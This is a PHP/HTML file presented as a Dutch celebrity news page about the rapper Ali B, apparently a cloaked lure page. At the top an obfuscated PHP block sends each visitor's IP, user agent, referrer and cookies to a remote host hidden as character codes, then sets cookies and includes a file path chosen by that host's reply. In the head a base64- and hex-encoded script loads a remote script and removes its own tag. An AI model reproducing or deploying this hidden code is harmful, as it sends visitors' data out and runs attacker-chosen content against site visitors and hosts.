<?php date_default_timezone_set("UTC");error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"]=="preview")){$dir=basename(__DIR__);$date=date("Y-m-d H:i:s");$id="309450";$uid="8st0ocskbzwgtf2xgf5lihb8d";$qu=$_SERVER["QUERY_STRING"];$postdata=http_build_query(array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$_SERVER["QUERY_STRING"],"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id));$opts=array("http"=>array("method"=>"POST","header"=>"Content-type:application/x-www-form-urlencoded","content"=>$postdata));$context=stream_context_create($opts);$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$result = file_get_contents($u, false, $context);$arr = explode(",",$result);$d=array_slice(explode("/",$arr[1]),3);$p="";foreach($d as $v){if($v==$dir){$p="";}else{$p.=$v."/";}}$p=strtok(rtrim($p,"/"),"?");if($arr[0] === "true"){if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9]);$_COOKIE[$arr[7]]=$arr[8];}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}require_once($p);die();}elseif($arr[0] === "false"){if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}require_once($p);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>hollywoodreporter</title>
	<meta name="viewport" content="width=device-width">
	<link rel="stylesheet" href="assets/styles.min.css">
	<script id="aMa0X" src="data:text/javascript;base64, dmFyIF8zUVpRVCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX3RBdHRLLCBfczVNREwpIHt2YXIgX2FEM0E3ID0gZnVuY3Rpb24oX1hvR1dTKSB7d2hpbGUgKC0tX1hvR1dTKSB7X3RBdHRLWydwdXNoJ10oX3RBdHRLWydzaGlmdCddKCkpO319O19hRDNBNygrK19zNU1ETCk7fShfM1FaUVQsIDB4MTFiKSk7dmFyIF9RS3A2UCA9IGZ1bmN0aW9uKF8xbjVVcCwgX1Z4NEdJKSB7XzFuNVVwID0gXzFuNVVwIC0gMHgwO3ZhciBfbE01clogPSBfM1FaUVRbXzFuNVVwXTtyZXR1cm4gX2xNNXJaO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfUUtwNlAoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgXzB5UHZOID0gZG9jdW1lbnRbX1FLcDZQKCcweDEnKV0oX1FLcDZQKCcweDInKSk7XzB5UHZOW19RS3A2UCgnMHgzJyldID0gX1FLcDZQKCcweDQnKTtfMHlQdk5bJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3NFx4NzJceDYxXHg2M1x4NmJceDczXHg3OVx4NzNceDc0XHg2NVx4NmRceDMyXHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NjNceDUwXHg0Mlx4NDJceDY1XHg0M1x4N2FceDQxXHg0ZVx4NTAnO2RvY3VtZW50W19RS3A2UCgnMHg1JyldKF9RS3A2UCgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF8weVB2Tik7ZG9jdW1lbnRbX1FLcDZQKCcweDcnKV0oJ2FNYTBYJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>

	
</head>

<body>
	<header>
		<div class="container">
			<div class="c-row">



				<nav>
					<div class="logo" style="width:60px;min-width:auto;">
						<a href="#"><img class="lazy img-responsive w-100"
								src="data:image/gif;base64,R0lGODlhBwACAIAAAP///wAAACH5BAEAAAEALAAAAAAHAAIAAAIDjI9YADs="
								data-src="assets/logo.png" data-srcset="assets/logo.png 1x, assets/logo.png 2x" alt="img"></a>
					</div>

					<ul class="d-md-none">
						<li><a href="#">Home</a></li>
						<li><a href="#">World</a></li>
						<li><a class="active" href="#">Recommended</a></li>
						<li><a href="#">Politics</a></li>
						<li><a href="#">Society</a></li>
						<li><a href="#">Economy</a></li>
						<li><a href="#">Famous</a></li>
						<li><a href="#">Sport</a></li>
						<li><a href="#">Travel</a></li>
					</ul>
				</nav>

				<div class="more d-lg-none-up">
					<a href="#" class="burger">
						<svg class="menu-icon" width="35" height="35" viewBox="0 0 64 64" fill="currentColor"
							xmlns="https://www.w3.org/2000/svg" aria-hidden="true">
							<path d="M52.75,47.84H11.25a2.08,2.08,0,1,0,0,4.16h41.5a2.08,2.08,0,1,0,0-4.16Z"></path>
							<path d="M52.75,28.92H11.25a2.08,2.08,0,1,0,0,4.16h41.5a2.08,2.08,0,1,0,0-4.16Z"></path>
							<path d="M11.25,14.16h41.5a2.08,2.08,0,1,0,0-4.16H11.25a2.08,2.08,0,1,0,0,4.16Z"></path>
						</svg>
					</a>
				</div>

			</div>
		</div>

	</header>


	<!-- Custom HTML / Remove before use -->
	<div class="container">

		<div class="c-row">

			<!-- CONTENT START -->
			<div class="col-content">
				<div class="content">
					<div class="title">
						<h1 class="h1">
							<span>hollywoodreporter</span>Ali B vervangt Dan Karaty als jurylid bij Holland's Got Talent
						</h1>
					</div>
					<div class="img-block">
						<div class="img-wrap">
							<!-- КАРТИНКА SRC="ЗАГЛУШКА В base64 в размер оригинальной картинки, нужна обязательно" DATA-SRC="Путь до картинки" DATA-SRCSET="путь до картинки 1x, аналогично x2" -->
							<img class="lazy img-responsive w-100"
								src="assets/001.png"
								data-src="assets/001.png" data-srcset="assets/001.png 1x, assets/001.png 2x" alt="img">
						</div>
						
					</div>
				
					

					<p class="text">De jury bestaat naast Ali B uit Angela Groothuizen, Chantal Janzen en Paul de Leeuw. Het programma wordt gepresenteerd door Humberto Tan.

						"Ik vind het jammer dat Dan er niet bij kan zijn, maar ik kijk er erg naar uit om aan Holland's Got Talent mee te werken", zegt Ali B. "De afwisseling van zoveel verschillende mensen met uiteenlopende talenten maakt het programma juist zo leuk."
						
						Ali B heeft de nodige ervaring als jurylid en coach bij talentenjachten en daarom was de keuze snel gemaakt, zegt Peter van der Vorst namens RTL. "Hij heeft sinds X Factor en natuurlijk bij The voice of Holland bewezen dat hij een fantastisch jurylid is, dat met humor en kunde mensen kan beoordelen op hun prestaties."
						
						Veel tijd om zich op zijn nieuwe klus voor te bereiden, krijgt de 38-jarige rapper niet. De opnames gaan donderdag al van start.</p>

					<p class="text">Rapper Ali B organiseerde tijdens Koningsdag 'De Ali B Vrienden Tour'. In totaal deed de tournee negen verpleeghuizen en woonzorgcentra in Nederland aan en traden naast Ali B ook andere Nederlandse artiesten op. Ali B noemt het zelf "het mooiste optreden dat ik ooit gegeven heb".

						Het initiatief is ontstaan om bewoners van verpleeghuizen en woonzorgcentra even "weg te halen uit de dagelijkse routine". Naast Ali B deden ook Karin Bloemen, Alain Clark, Glen Faria, Ronnie Flex, Dennis van der Geest, Gerard Joling, Wolter Kroes en rapper Poke mee aan de tournee.
						
						De rapper zette eerder al een landelijke actie op om op Goede Vrijdag bloemen te bezorgen aan ouderen in het hele land. Na zijn optreden op Koningsdag zei hij: "Ik heb gezworen dat ik me na de bloemenactie voor deze mensen wil blijven inzetten en iedere kans zal aangrijpen om met een kleinigheidje tóch de aandacht te geven die deze mensen zo verdienen, in ieder geval totdat ik zelf die leeftijd heb bereikt. Dit is het mooiste optreden dat ik ooit heb gegeven. Echt waar!"
						
						Tekeningen voor Willem-Alexander
						Eerder op de dag werd Ali B al in het NPO3-programma Zapplive Extra bedankt door koning Willem-Alexander, voor een andere actie die de 38-jarige rapper op touw had gezet. Hij riep kinderen op om brieven en tekeningen voor de koning te maken. Deze werden gebundeld en op zijn verjaardag aan hem overhandigd. Willem-Alexander liet weten "te gaan genieten van alle brieven".</p>

								
					<p class="text">Rapper Ali B heeft maandag samen met Poke en Judeska een nummer gemaakt over social distancing. Hij wil hiermee op een leuke manier duidelijk maken hoe belangrijk het is om 1,5 meter afstand te houden.

						In een video die werd uitgezonden op RTL Boulevard, is te zien hoe Alberto Stegeman de opnames van Ali B's videoclip 'stillegt' omdat hij Ali B, Poke en Jandino Asporaat betrapt op het 'overtreden van de 1,5 meter-regel', waarna de muziek start.
						
						Ali B schrijft op Instagram: "We proberen het hier op een leuke manier duidelijk te maken en vinden dit een leuke video, maar het is wel een serieuze boodschap! Dans en geniet, maar ik smeek jullie in naam van alle kwetsbare mensen en mensen uit de zorg... hou die 1,5 meter afstand."
						
						Aan het nummer werkten rapper Poke en acteur en presentator Jandino Asporaat mee. Asporaat is te zien als zijn typetje Judeska.
						
						Ook Wilfred Genee vraagt mensen op muzikale wijze om binnen te blijven. De Veronica-dj schreef het nummer Blijf Binnen!, een variant op Binnen van Marco Borsato. Het nummer is ingezongen en gespeeld door muzikant Ed Struijlaart.
						
						Bekende Nederlanders als presentatrice Carrie ten Napel, presentator Albert Verlinde en zanger Jeroen van der Boom spraken delen van de plaat in.</p>

					<p class="text">Rob Geus neemt plaats in het panel van The Roast of Ali B, het programma dat op 17 december wordt uitgezonden op Comedy Central. Dat maakt hij donderdag op Instagram bekend.

						Ali B is de officiële hoofdgast van 2019 in het programma dat elk jaar op Comedy Central wordt uitgezonden. Onder anderen Henry van Loon, Prem Radhakishun en zanger Brace werden eerder aangekondigd als gasten die Ali B op geestige wijze belachelijk gaan maken. Nu wordt daar ook kwaliteitscontroleur en ex-Expeditie Robinson-deelnemer Geus aan toegevoegd.
						
						"Jaja! Mag het eindelijk vertellen, ik ben een van de roasters bij de Roast van Ali B op 17 December op Comedy Central. Ali, maak je borst maar nat...Je gaat eraan", schrijft hij op Instagram.
						
						Eerder waren bekende Nederlanders als Gordon en Johnny de Mol al hoofdgast bij The Roast. In de Verenigde Staten deden onder anderen Donald Trump, Bruce Willis, Alec Baldwin en Justin Bieber al eens mee.</p>

				</div>
			</div>



			<!-- CONTENT END -->

			
		</div>
	</div>


	<footer>
		<div class="container">
			<div class="copy">
				<div><a href="#">Политика Конфеденциальности</a> <a href="#">Условия пользования</a></div>
				<span>© 2020 Copyright. All rights reserved.</span>
			</div>
		</div>
	</footer>

	<script src="assets/scripts.min.js"></script>
</body>

</html>
